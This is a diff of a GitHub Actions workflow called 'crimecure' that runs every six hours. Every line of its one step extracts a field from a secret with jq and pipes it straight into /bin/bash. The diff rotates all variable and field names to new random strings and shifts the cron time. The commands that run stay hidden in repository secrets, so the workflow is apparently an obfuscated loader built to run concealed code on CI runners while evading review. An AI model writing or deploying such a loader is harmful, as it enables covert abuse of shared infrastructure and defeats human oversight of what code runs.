@@ -2,31 +2,30 @@ name: crimecure
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 4/6 * * *'
+    - cron: '53 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: crimecure
         env:
-          mqclg78613: ${{ secrets.mqclg78613 }}
+          l29: ${{ secrets.l29 }}
         run: |
-          echo $mqclg78613 | jq -r .xwxg4 | /bin/bash
-          echo $pevu346 | jq -r .atxnx88 | /bin/bash
-          echo $adakb73 | jq -r .m24 | /bin/bash
-          echo $lfbin7832 | jq -r .xkrgt7856 | /bin/bash
-          echo $tjh63667 | jq -r .xtekv68 | /bin/bash
-          echo $r97574 | jq -r .wqm67 | /bin/bash
-          echo $dojmb2 | jq -r .ymks90186 | /bin/bash
-          echo $l12 | jq -r .lqjme484 | /bin/bash
-          echo $dxs75471 | jq -r .oijfy787 | /bin/bash
-          echo $r18 | jq -r .z94 | /bin/bash
-          echo $b9 | jq -r .z65019 | /bin/bash
-          echo $ibba256 | jq -r .ccy5328 | /bin/bash
-          echo $pmkaq85 | jq -r .il31 | /bin/bash
-          echo $l91 | jq -r .ngey514 | /bin/bash
-          echo $w4 | jq -r .x45649 | /bin/bash
+          echo $l29 | jq -r .g5 | /bin/bash
+          echo $opq726 | jq -r .q83891 | /bin/bash
+          echo $dvcz790 | jq -r .mi0953 | /bin/bash
+          echo $opgys5238 | jq -r .hqb1473 | /bin/bash
+          echo $tmex5 | jq -r .rcyds40 | /bin/bash
+          echo $icp23 | jq -r .v08 | /bin/bash
+          echo $bivcm20 | jq -r .yv5 | /bin/bash
+          echo $fjhmw2 | jq -r .tnr8264 | /bin/bash
+          echo $oct0 | jq -r .xqhk2 | /bin/bash
+          echo $f377 | jq -r .bmjeo996 | /bin/bash
+          echo $sxn8015 | jq -r .o1 | /bin/bash
+          echo $q81 | jq -r .qfi83 | /bin/bash
+          echo $jpz8 | jq -r .kxsi7156 | /bin/bash
+          echo $hfoab48213 | jq -r .sge319 | /bin/bash
+          echo $rtoud333 | jq -r .hgrbq0383 | /bin/bash
 
